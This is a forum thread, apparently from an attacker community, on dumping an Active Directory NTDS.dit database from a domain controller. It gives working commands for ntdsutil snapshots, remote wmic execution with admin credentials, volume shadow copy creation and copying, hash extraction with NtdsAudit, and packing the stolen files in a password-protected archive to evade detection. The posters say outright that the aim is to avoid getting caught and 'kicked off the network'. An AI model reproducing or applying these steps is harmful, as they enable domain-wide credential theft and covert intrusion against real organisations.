@@ -1,0 +1,121 @@
+    Vampir
+    New Topics
+    New replies
+
+    Start
+    Help
+    Search
+    Profile
+    Private Messages
+    Members
+
+Monica Bellucci Fan Club
+
+    Monica Bellucci Fan Club "
+    Kill Chain "
+    Privilege Escalation "
+    NTDS Dumping
+
+NTDS Dumping
+Rozetka - 2 - 97
+" previous topic next topic "
+
+Pages: 1
+Rozetka
+
+    Administrator
+    Member
+    *****
+        35
+        View Profile E-mail Private Message (Offline)
+
+: February 11, 2021, 03:06:00 pm
+Written by
+
+on PDC RUN from SYS / ADMIN
+Cite
+
+    ntdsutil "ac i ntds" "ifm" "create full c:\windows\temp\Crashpad\Temp\abc" q q
+
+
+
+and use for decrypt
+Code: [Highlight]
+
+https://github.com/Dionach/NtdsAudit
+
+Cite
+
+    ntdsaudit ntds.dit -s SYSTEM -p pwdump.txt -u users.csv
+
+5 sec and you get all hashes
+vjyh!
+
+What is the alternative that is SO much quieter?
+
+t3chnolog
+
+    Administrator
+    Member
+    *****
+        1
+        View Profile E-mail Private Message (Offline)
+
+Response #1 : February 19, 2021, 03:15:50 pm
+Written by
+
+Code: [Highlight].
+
+shell wmic /node: "DC01" /user: "DOMAIN\admin" /password: "cleartextpass" process call create "cmd /c vssadmin list shadows >> c:\log.txt"
+
+
+query the shaddy listings, there is a date, check if it is a recent date.
+They're almost certainly already there. If not, you'll have to do it yourself.
+Code: [Highlight]
+
+net start Volume Shadow Copy
+shell wmic /node: "DC01" /user: "DOMAIN\admin" /password: "cleartextpass" process call create "cmd /c vssadmin create shadow /for=C: 2>&1"
+
+
+then in the Shadow Copy listing find the most recent one
+Shadow Copy Volume: \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy55
+Correspondingly we need the shadow copy number for the following command
+Code: [Highlight]
+
+shell wmic /node: "DC01" /user: "DOMAIN\admin" /password: "cleartextpass" process call create "cmd /c copy \\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy55\Windows\NTDS\NTDS.dit c:\temp\log\ & copy \\?\"GGLOBALROOT\Device\HarddiskVolumeShadowCopy55\Windows\System32\config\SYSTEM c:\temp\log\ & copy \\\?
+
+
+ntds.dit / security / system files should fall into c:\temp\log\
+take the portable console 7z and pack it in the archive with password
+Code: [Highlight]
+
+7za.exe a -tzip -mx5 \\DC01\C$\temp\log.zip \\DC01\C$\temp\log -pTOPSECRETPASSWORD
+
+
+download the password-protected archive to yourself, if you get an error when you decrypt the ntds file (the file is corrupted), then do the following
+Code: [Highlight]
+
+Esentutl /p C:\log\ntds.dit
+
+
+the trick of this method is that we do not actually dump anything, we just take and download the ntds
+so we don't get caught pulling out the ntds we pack it in a password protected archive
+
+If you have a problem with being burnt and kicked off the network after a ntds dump, try this method
+it can be burned only by the fact of some leaked date from cd, and it is impossible to analyze what exactly you take without knowing the password from the archive
+
+Pages: 1
+
+    Monica Bellucci Fan Club "
+    Kill Chain "
+    Privilege Escalation "
+    NTDS Dumping
+
+Go to:
+ 
++ Quick Reply
+
+    SMF 2.0.18 | SMF © 2020, Simple Machines
+    Developed with SychO
+
+
